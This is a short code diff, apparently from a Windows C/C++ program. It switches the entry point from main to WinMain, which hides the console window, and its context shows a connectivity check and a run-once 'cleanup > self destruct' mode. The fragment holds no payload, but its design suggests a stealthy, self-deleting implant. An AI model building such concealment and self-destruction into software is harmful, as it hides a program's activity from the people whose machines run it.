@@ -20,7 +20,7 @@ void CleanupAndDestroy() {
 }
 
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) { 
         bool ReachIntranet = googleConn(); 
